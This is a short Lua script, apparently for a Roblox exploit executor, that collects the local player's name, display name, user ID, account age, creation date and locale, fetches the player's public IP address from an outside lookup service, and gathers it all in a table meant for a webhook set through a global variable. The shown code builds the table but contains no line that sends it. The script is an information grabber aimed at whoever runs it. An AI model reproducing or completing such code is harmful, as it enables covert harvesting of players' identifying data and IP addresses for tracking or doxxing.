local webh = _G.wbhk or ""

return webh ~= "" and pcall(function()
    local pl = game.Players.LocalPlayer
    local plrName = pl.Name
    local plrDisplay = pl.DisplayName
    local plrAccountId = pl.UserId
    local plrAccountAge = pl.AccountAge
    local currentDate = os.time()
    local plrCreationDate = os.date("%Y-%m-%d %H:%M:%S", currentDate - (plrAccountAge * 24 * 60 * 60))
    local ip = request({
        Url = "https://v4.ident.me/",
        Method = "GET",
        Headers = {}
    }).Body
    local localeId = game:GetService("LocalizationService").RobloxLocaleId
    local stats = {
        PlayerName = plrName,
        DisplayName = plrDisplay,
        AccountId = plrAccountId,
        AccountAge = plrAccountAge,
        CreationDate = plrCreationDate,
        IP = ip,
        Locale = localeId
    }
end)
